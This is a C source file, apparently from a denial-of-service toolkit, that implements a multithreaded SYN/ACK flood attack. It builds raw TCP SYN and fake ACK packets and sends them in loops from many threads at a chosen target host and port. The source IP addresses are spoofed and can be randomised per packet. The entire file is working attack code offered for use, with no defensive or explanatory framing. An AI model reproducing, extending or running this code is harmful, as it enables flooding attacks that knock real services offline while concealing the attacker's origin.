#include <stdio.h>  // memset
#include <string.h> // strlen
#include <stdlib.h> // exit
#include <errno.h>  // errno
#include <stdarg.h> // va_list
#include <pthread.h>

#include <unistd.h> // close
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "../main.h"

static int _send_syn_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rt)
{
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // create a raw socket
    if (socket_fd < 0)
        error(strerror(errno));

    // char datagram[4096] = {'\0'};
    char *datagram = (char *)calloc(sizeof(struct ip) + sizeof(struct tcphdr), sizeof(char));

    struct ip *iph = (struct ip *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));

    /* for sendto user */
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr(daddr);

    iph->ip_v = 4;
    iph->ip_hl = 5; // header length
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(randport()); // unsigned 16 bits from 0 to 65535
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;                       // set to 0 before calculating checksum
    iph->ip_src.s_addr = inet_addr(saddr); // spoof the source ip address
    iph->ip_dst.s_addr = inet_addr(daddr);
    iph->ip_sum = htons(checksum((unsigned short *)datagram, sizeof(struct ip), NULL, 0));

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // TCP header length is 20 Bytes
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(65535); // maximum allowed window size
    tcph->check = 0;
    tcph->urg_ptr = 0;

    struct pseudo_header_tcp *psh = (struct pseudo_header_tcp *)malloc(sizeof(struct pseudo_header_tcp));
    psh->saddr = inet_addr(saddr);
    psh->daddr = sin.sin_addr.s_addr;
    psh->placeholder = 0;
    psh->protocol = IPPROTO_TCP;
    psh->tcp_length = htons(20);
    memcpy(&psh->tcph, tcph, sizeof(struct tcphdr));
    tcph->check = htons(checksum((unsigned short *)psh, sizeof(struct pseudo_header_tcp), NULL, 0));
    free(psh);

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
        error("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);

    for (int i = 0; i < rt; i++)
        if (sendto(socket_fd, datagram, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            error(strerror(errno));

    close(socket_fd);

    return 0;
}

static int _send_ack_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rt)
{
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // create a raw socket
    if (socket_fd < 0)
        error(strerror(errno));

    // char datagram[4096] = {'\0'}; // datagram to represent the packet
    char *datagram = (char *)calloc(sizeof(struct ip) + sizeof(struct tcphdr), sizeof(char));

    struct ip *iph = (struct ip *)datagram;                                // IP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip)); // TCP header

    /* for sendto user */
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr(daddr);

    iph->ip_v = 4;
    iph->ip_hl = 5; // header length
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(randport()); // unsigned 16 bits from 0 to 65535
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;                       // set to 0 before calculating checksum
    iph->ip_src.s_addr = inet_addr(saddr); // spoof the source ip address
    iph->ip_dst.s_addr = inet_addr(daddr);
    iph->ip_sum = checksum((unsigned short *)datagram, sizeof(struct ip), NULL, 0);

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = 0;
    tcph->ack_seq = htons(randport());
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 1; // magic
    tcph->urg = 0;
    tcph->window = htons(65535); // maximum allowed window size
    tcph->check = 0;
    tcph->urg_ptr = 0;

    struct pseudo_header_tcp *psh = (struct pseudo_header_tcp *)malloc(sizeof(struct pseudo_header_tcp));
    psh->saddr = inet_addr(saddr);
    psh->daddr = sin.sin_addr.s_addr;
    psh->placeholder = 0;
    psh->protocol = IPPROTO_TCP;
    psh->tcp_length = htons(20);
    memcpy(&psh->tcph, tcph, sizeof(struct tcphdr));
    tcph->check = checksum((unsigned short *)psh, sizeof(struct pseudo_header_tcp), NULL, 0);
    free(psh);

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
        error("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);

    for (int i = 0; i < rt; i++)
        if (sendto(socket_fd, datagram, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            error(strerror(errno));
            break;
        }

    close(socket_fd);
    return 0;
}

static void _attack_thread(pSFTP parameters)
{
    char *daddr = parameters->daddr;
    int dport = parameters->dport;
    // int rep = parameters->rep;
    // every ip's repeat times be small (because this is syn ack joint attack)

#ifdef DEBUG
    char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
    saddr = randip(&saddr);
    int sport = randport();
    warning("thread start...");
    warning("sending syn package...");
    _send_syn_packet(daddr, dport, saddr, sport, 4);
    warning("sending ack package...");
    _send_ack_packet(daddr, dport, saddr, sport, 4);
    free(saddr);
#else
    unsigned int pn = parameters->pn;
    if (parameters->rdsrc)
    {
        char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
        int sport;
        for (unsigned int i = 1; i != pn; i++)
        {
            saddr = randip(&saddr);
            sport = randport();
            _send_syn_packet(daddr, dport, saddr, sport, 4);
            _send_ack_packet(daddr, dport, saddr, sport, 4);
        }
        free(saddr);
    }
    else
    {
        char *saddr = parameters->saddr;
        int sport = parameters->sport;
        for (unsigned int i = 1; i != pn; i++)
        {
            _send_syn_packet(daddr, dport, saddr, sport, 4);
            _send_ack_packet(daddr, dport, saddr, sport, 4); // fake ack packet
        }
    }
#endif
}

int syn_ack_joint_flood_attack(char *url, int port, ...)
{
    /*
     * parameters:
     * 0 - url
     * 1 - port
     * 2 - random source address label (int)
     * 3 - random source address repetition time (int)
     * 4 - thread number (int)
     * 5 - source ip address (char *)
     * 6 - source port (int)
     * 7 - packet number (unsigned int)
     */

    int slist[4] = {'\0'};
    int i;

    va_list vlist;
    va_start(vlist, port);
    for (i = 0; i < 3; i++)
    {
        slist[i] = va_arg(vlist, int);
    }
    int random_saddr = slist[0];
    int rep = slist[1];
    int thread_number = slist[2];
    char *saddr = va_arg(vlist, char *);
    int sport = va_arg(vlist, int);
    unsigned int pn = va_arg(vlist, unsigned int);
    va_end(vlist);

    pSFTP parameters = (pSFTP)malloc(sizeof(SFTP));
    parameters->daddr = url;
    parameters->dport = port;
    parameters->rdsrc = random_saddr;
    parameters->rt = rep;
    parameters->saddr = saddr;
    parameters->sport = sport;
    parameters->pn = pn;

    pthread_t tid_list[thread_number];
    pthread_attr_t attr;
    int ret;

    if (strlen(url))
        if (strstr(url, "http"))
            error("ack flood attack target's address should not include 'http' or 'https'");
    if (port == 0)
        error("please specify a target port");

    for (i = 0; i < thread_number; i++)
    {
        if (pthread_attr_init(&attr))
            error(strerror(errno));
        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            error(strerror(errno));
        // create thread
        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
        if (ret != 0)
            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
        pthread_attr_destroy(&attr);
    }
    // pthread_detach(tid);
    // join them all
    for (i = 0; i < thread_number; i++)
        pthread_join(tid_list[i], NULL);

    free(parameters);
    return 0;
}
